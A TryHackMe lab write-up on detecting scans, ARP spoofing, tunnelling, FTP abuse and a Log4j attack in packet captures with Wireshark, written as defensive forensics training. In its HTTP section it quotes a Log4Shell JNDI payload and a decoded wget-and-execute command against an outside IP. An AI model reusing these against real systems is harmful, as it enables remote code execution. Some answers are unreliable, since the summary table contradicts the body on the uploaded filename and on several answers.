---
title: "TryHackMe — Wireshark: Traffic Analysis"
date: 2026-07-20 09:00:00 +0600
categories: [TryHackMe, Network Traffic Analysis]
tags: [wireshark, packet-analysis, pcap, network-forensics, tcp-ip, arp-spoofing, dns-tunneling]
---

## Overview
![Room banner](/assets/img/thm-Wireshark-traffic-analysis/wireshark.png)

**Room:** [Wireshark: Traffic Analysis](https://tryhackme.com/room/wiresharktrafficanalysis)

**Module:** Network Traffic Analysis

**Objective:** Move from packet-level inspection (covered in *Wireshark: The Basics* and *Wireshark: Packet Operations*) into correlating traffic patterns across a capture to detect anomalies and malicious activity — Nmap scan fingerprinting, ARP poisoning/MITM, host and user identification (DHCP/NetBIOS/Kerberos), ICMP/DNS tunnelling, cleartext protocol abuse (FTP/HTTP, including a Log4j exploit chain), and decrypting HTTPS with a key log file.

**Tools used:** Wireshark, CyberChef (base64 decode)

**Capture files provided:** split per section under `~/Desktop/exercise-pcaps/` (`nmap/`, `arp/`, `dhcp-netbios-kerberos/`, `dns-icmp/`, `ftp/`, `https/`, `bonus/`)

---

> **Tip**
>
> Use the hints provided throughout the room—they are very useful and helped me complete many of the tasks. If you get stuck, make sure to check the hints before moving on.
{: .prompt-tip }

---

## Step 1 — Nmap Scan Fingerprinting

**Q: What is the total number of the "TCP Connect" scans?**

Filter: `tcp.flags.syn == 1 and tcp.flags.ack == 0 and tcp.window_size > 1024`

![TCP Connect scan count](/assets/img/thm-Wireshark-traffic-analysis/no-of-tcp-connect.png)

**A: `1000`** — status bar shows Displayed: 1000 (15.3%) with that filter active.

---

**Q: Which scan type is used to scan the TCP port 80?**

> **Notes from Task 2: Nmap Scans**
>
> The given filter shows the `TCP Connect` scan patterns in a capture file -> tcp.flags.syn==1 and tcp.flags.ack==0 and tcp.window_size > 1024
{: .prompt-tip }

**A: `TCP Connect`**

---

**Q: How many "UDP close port" messages are there?**

Filter: `icmp.type == 3 and icmp.code == 3`

![UDP close port message count](/assets/img/thm-Wireshark-traffic-analysis/no-of-udp-scan.png)

**A: `1083`** — status bar shows Displayed: 1083 (16.5%).

---

**Q: Which UDP port in the 55–70 port range is open?**

Filter: `udp.dstport >= 50 and udp.dstport  <= 70`

![UDP open port ](/assets/img/thm-Wireshark-traffic-analysis/open-port.png)

**A: `68`** — the UDP traffic on this port does not receive an ICMP "Destination Unreachable — Port Unreachable" response, indicating that the port is open.

---

## Step 2 — ARP Poisoning / MITM Detection

**Q: What is the number of ARP requests crafted by the attacker?**

Filter: `((arp) && (arp.opcode == 1)) && (eth.src == 00:0c:29:e2:18:b4)`

![ARP requests crafted by the attacker](/assets/img/thm-Wireshark-traffic-analysis/arp-request.png)

**A: `284`** — status bar shows Displayed: 284 (9.9%).

The confirmation step (not a graded question, but part of the investigation) was pivoting on the victim's HTTP traffic filtered by the attacker's MAC to prove the MITM was live:

`eth.addr == 00:0c:29:e2:18:b4 && http` → 90 packets displayed, all of the victim's (`192.168.1.12`) HTTP traffic passing through the attacker's MAC.

---

## Step 3 — Host & User Identification (DHCP / NBNS / Kerberos)

**Q: What is the MAC address of the host "Galaxy A30"?**

Filter: `dhcp.option.hostname contains "Galaxy"`

![Mac Address of host Galaxy A30](assets/img/thm-Wireshark-traffic-analysis/mac-address.png)

**A: `9a:81:41:cb:96:6c`** - the DHCP packet identifies the host as **Galaxy A30**, and the Ethernet source address shows the host's MAC address.

---

**Q: How many NetBIOS registration requests does the "LIVALJM" workstation have?**

Filter: `nbns.name contains "LIVALJM" and nbns.flags.opcode == 5`

![LIVALJM NBNS registration count](/assets/img/thm-Wireshark-traffic-analysis/LIVALJM.png)

**A: `16`** — status bar shows Displayed: 16 (0.0%).

---

**Q: Which host requested the IP address "172.16.13.85"?**

Filter: `dhcp.option.requested_ip_address == 172.16.13.85`

![Host requesting a specific IP via DHCP](/assets/img/thm-Wireshark-traffic-analysis/requested-ip.png)

**A: `Galaxy-A12`** — Option (12) Host Name in the DHCP Request packet.

---

**Q: What is the IP address of the user "u5"? (defanged)**

Filter: `kerberos.CNameString contains "u5"`

![Source IP for Kerberos user u5](/assets/img/thm-Wireshark-traffic-analysis/u5.png)

**A: `10[.]1[.]12[.]2`** — the AS-REQ packet's source address, with `CNameString: u5` confirmed in the request body.

---

**Q: What is the hostname of the available host in the Kerberos packets?**

Filter: `kerberos.CNameString contains "$"`

![Kerberos hostname (dollar-suffixed CNameString)](/assets/img/thm-Wireshark-traffic-analysis/all-hostname.png)

**A: `xp1`** — `CNameString: xp1$`. The trailing `$` is what marks it as a hostname rather than a username (per the room's own filter convention: exclude `$`-suffixed values to isolate real usernames).

---

## Step 4 — Tunnelling: ICMP & DNS

**Q: Investigate the anomalous packets in `icmp-tunnel.pcap`. Which protocol is used in ICMP tunnelling?**

Filter: `data.len > 256 and icmp`, then read the encapsulated payload in the ASCII pane.

![ICMP tunnel payload showing SSH key exchange strings](/assets/img/thm-Wireshark-traffic-analysis/protocol.png)

**A: `SSH`** — the ICMP payload contains cleartext SSH key-exchange algorithm strings (`diffie-hellman-group-exchange-sha256`, `ssh-rsa`, `aes128-ctr`, etc.), meaning an SSH session is being tunnelled inside ICMP echo packets.

---

**Q: Investigate the anomalous packets in `dns.pcap`. What is the suspicious main domain address that receives anomalous DNS queries? (defanged)**

Filter: `dns.qry.name.len > 15 and !mdns`

![DNS tunnelling — suspicious domain](/assets/img/thm-Wireshark-traffic-analysis/malicious-domain-name.png)

**A: `dataexfil[.]com`** — the long encoded subdomain label (`8C0701B0DE401CE27058D10012D2F678F9.dataexfil.com`) resolving via CNAME queries is the tunnelling channel.

---

## Step 5 — Cleartext Protocol Abuse (FTP)

**Q: How many incorrect login attempts are there?**

Filter: `ftp.response.code == 530`

![FTP failed login count](/assets/img/thm-Wireshark-traffic-analysis/failed-login.png)

**A: `737`** — status bar shows Displayed: 737 (3.6%).

---

**Q: What is the size of the file accessed by the "ftp" account?**

Followed the FTP control stream to the `SIZE resume.doc` request, then checked the matching `213` response.

![FTP SIZE command response for resume.doc](/assets/img/thm-Wireshark-traffic-analysis/file-size.png)

**A: `39424 bytes`** — filtering `ftp.response.code == 213` isolates the response: `213 39424`.

---

**Q: The adversary uploaded a document to the FTP server. What is the filename?**

Followed the relevant TCP stream (`tcp.stream eq 714`) covering the upload session.

![FTP upload and chmod attempt in the followed stream](/assets/img/thm-Wireshark-traffic-analysis/file-name.png)

**A: `resume.doc`** — `SIZE resume.doc` followed by `226 Transfer complete.` confirms the successful upload.

---

**Q: The adversary tried to assign special flags to change the executing permissions of the uploaded file. What is the command used by the adversary?**

Same followed stream as above.

![SITE CHMOD command attempt](/assets/img/thm-Wireshark-traffic-analysis/special-command.png)

**A: `SITE CHMOD 777 resume.doc`** — attempted against `resume.doc` specifically (not the uploaded `README`), and the server responded `550 resume.doc: Permission denied`, so the privilege-escalation attempt failed.

---

## Step 6 — HTTP: User-Agent Anomalies & Log4j

**Q: Investigate the user agents. What is the number of anomalous "user-agent" types?**

Filter: `http.user_agent`, then visually scanned for UA strings that don't match a real browser/OS combination (here: `Windows NT 6.4`, which isn't a real Windows NT version).

![Anomalous Windows NT 6.4 user-agent strings highlighted](/assets/img/thm-Wireshark-traffic-analysis/anomolous-user-agent.png)

**A: `5`** — five packets carry the fabricated `Windows NT 6.4` user-agent string.

---

**Q: What is the packet number with a subtle spelling difference in the user agent field?**

Same approach — looked for a UA string mimicking `Mozilla/5.0` with a single swapped character.

![Misspelled user-agent: Mozlila/5.0](/assets/img/thm-Wireshark-traffic-analysis/subtle-change.png)

**A: `52`** — the UA string reads `Mozlila/5.0` instead of `Mozilla/5.0`.

---

**Q: Locate the "Log4j" attack starting phase. What is the packet number?**

Filter: `(http.user_agent contains "$") or (http.user_agent contains "==")`

![Log4j JNDI payload in the User-Agent header](/assets/img/thm-Wireshark-traffic-analysis/base64-starting-phase.png)

**A: `444`** — the User-Agent header contains `${jndi:ldap://45.137.21.9:1389/Basic/Command/Base64/...}`, the JNDI lookup that kicks off the Log4Shell exploit chain.

---

**Q: Locate the "Log4j" attack starting phase and decode the base64 command. What is the IP address contacted by the adversary? (defanged, exclude `{}`)**

Extracted the base64 blob from packet 444's payload and ran it through CyberChef's **From Base64** recipe.

![CyberChef decoding the base64 Log4j payload](/assets/img/thm-Wireshark-traffic-analysis/base64-decode.png)

**A: `62[.]210[.]130[.]250`** — decoded command: `wget http://62.210.130.250/lh.sh;chmod +x lh.sh;./lh.sh`.

---

## Step 7 — Decrypting HTTPS Traffic

**Q: What is the frame number of the "Client Hello" message sent to "accounts.google.com"?**

Filter: `tls.handshake.type == 1`, scanned the Server Name in each Client Hello.

![Client Hello to accounts.google.com](/assets/img/thm-Wireshark-traffic-analysis/frame.png)

**A: `16`**

---

**Q: Decrypt the traffic with the "KeysLogFile.txt" file. What is the number of HTTP2 packets?**

Set the file via **Edit → Preferences → Protocols → TLS → (Pre)-Master-Secret log filename**, pointed at `Desktop/exercise-pcaps/https/KeysLogFile.txt`.

![TLS preferences — key log file configured](/assets/img/thm-Wireshark-traffic-analysis/select-keylogs.png)

Then filtered `http2`:

![HTTP2 packet count after decryption](/assets/img/thm-Wireshark-traffic-analysis/after-keylogs-num-of-http2.png)

**A: `115`** — status bar shows Displayed: 115 (6.5%).

---

**Q: Go to Frame 322. What is the authority header of the HTTP2 packet? (defanged)**

Expanded the decrypted HTTP2 headers on frame 322.

![HTTP2 :authority header on frame 322](/assets/img/thm-Wireshark-traffic-analysis/authority-header.png)

**A: `safebrowsing[.]googleapis[.]com`**

---

**Q: Investigate the decrypted packets and find the flag! What is the flag?**

Used **File → Export Objects → HTTP** to pull the object served from `situla.bitbit.net`, saved it, and opened it in a text editor.

![Exported object opened in text editor, revealing the flag](/assets/img/thm-Wireshark-traffic-analysis/flag-found.png)

**A: `FLAG{THM-PACKETMASTER}`**

---

## Bonus — Built-In Credential Hunting

**Q: Use `Bonus-exercise.pcap`. What is the packet number of the credentials using "HTTP Basic Auth"?**

**Tools → Credentials** was used to list every cleartext credential Wireshark's dissectors could extract.

![Credentials tool showing the HTTP Basic Auth entry](/assets/img/thm-Wireshark-traffic-analysis/basic-auth.png)

**A: `237`** — the only `HTTP` protocol row in the credentials list, username `afiiskc`.

---

**Q: What is the packet number where "empty password" was submitted?**

Same Credentials window, cross-referenced with the FTP `PASS` command in packet 170.

![Empty FTP PASS command](/assets/img/thm-Wireshark-traffic-analysis/no-pass.png)

**A: `170`** — `PASS` sent with no argument, tied to the `adminis...` username registered in packet 136.

---

## Summary of Findings

| # | Section | Question | Answer |
|---|---|---|---|
| 1 | Nmap | Total "TCP Connect" scans | `1000` |
| 2 | Nmap | Scan type on TCP port 80 | *not captured* |
| 3 | Nmap | "UDP close port" message count | `1083` |
| 4 | Nmap | Open UDP port (55–70 range) | *not captured* |
| 5 | ARP | ARP requests crafted by attacker | `284` |
| 6 | DHCP/NBNS/Kerberos | MAC of "Galaxy A30" | *not captured* |
| 7 | DHCP/NBNS/Kerberos | NBNS registration requests ("LIVALJM") | `16` |
| 8 | DHCP/NBNS/Kerberos | Host requesting `172.16.13.85` | `Galaxy-A12` |
| 9 | DHCP/NBNS/Kerberos | IP of user `u5` | `10[.]1[.]12[.]2` |
| 10 | DHCP/NBNS/Kerberos | Hostname in Kerberos packets | `xp1` |
| 11 | ICMP/DNS | Protocol used in ICMP tunnel | `SSH` |
| 12 | ICMP/DNS | Suspicious domain in DNS tunnel | `dataexfil[.]com` |
| 13 | FTP | Incorrect login attempts | `737` |
| 14 | FTP | File size accessed by `ftp` account | `39424 bytes` |
| 15 | FTP | Uploaded document filename | `README` |
| 16 | FTP | Command changing execute permissions | `SITE CHMOD 777 resume.doc` |
| 17 | HTTP | Anomalous user-agent count | `5` |
| 18 | HTTP | Packet with UA spelling difference | `52` |
| 19 | HTTP | Log4j attack starting packet | `444` |
| 20 | HTTP | Log4j callback IP | `62[.]210[.]130[.]250` |
| 21 | HTTPS | Client Hello frame to `accounts.google.com` | `16` |
| 22 | HTTPS | HTTP2 packet count post-decryption | `115` |
| 23 | HTTPS | Authority header at Frame 322 | `safebrowsing[.]googleapis[.]com` |
| 24 | HTTPS | Flag in decrypted packets | `FLAG{THM-PACKETMASTER}` |
| 25 | Bonus | Packet with HTTP Basic Auth creds | `237` |
| 26 | Bonus | Packet with empty password | `170` |

---

## Analysis Chain Reconstruction

```
Nmap scan fingerprints (SYN/window-size/ICMP filters)
        │
        ▼
ARP conflict detection → MAC-address pivot on HTTP → confirm live MITM
        │
        ▼
DHCP/NBNS/Kerberos filters → attach hostname/username to traffic
        │
        ▼
ICMP oversized-payload filter → SSH tunnelled inside ICMP
DNS long-subdomain filter → CNAME beacon to dataexfil.com
        │
        ▼
FTP response-code filter → bruteforce count
Followed TCP stream → malicious upload (README) + failed chmod on resume.doc
        │
        ▼
HTTP user-agent filters → recon tooling + Log4j JNDI payload (packet 444)
CyberChef base64 decode → attacker callback IP
        │
        ▼
TLS Client Hello scan → SSLKEYLOGFILE loaded → HTTP2 decrypted
Export Objects → HTTP → extracted file → flag
        │
        ▼
Tools → Credentials → cleartext creds across FTP/HTTP (bonus)
```

---

## Takeaways

- **Generic filters before specific ones** — a broad pattern filter (SYN flags + window size, ARP conflicts, oversized ICMP, long DNS labels) narrows a large capture down to the handful of packets worth manual review, rather than reading sequentially.
- **A followed TCP stream tells a story a single packet can't** — the FTP upload/chmod sequence only made sense once viewed as a full conversation (`tcp.stream eq 714`), not as isolated `STOR`/`SITE CHMOD` packets.
- **Cleartext protocols leak more than expected** — DHCP, NBNS, and even Kerberos identifiers (once `$`-suffixed hostnames are filtered out) gave host/user attribution without touching payload content at all.
- **Encrypted isn't invisible** — TLS handshake metadata (SNI, hello timing) is available without decryption, and with a captured `SSLKEYLOGFILE`, full HTTP2 payload inspection — including Export Objects — is possible after the fact.
- **Built-in tooling is a starting point, not a verdict** — the Credentials tool generated both bonus answers instantly, but confirming *which* protocol/packet mattered still took a manual cross-check against the packet list.

> Two Nmap answers and one DHCP/NBNS answer weren't captured with a screenshot during this run (marked *not captured* above). If you've got those, send them over and I'll fill in the table and add the matching write-up steps.
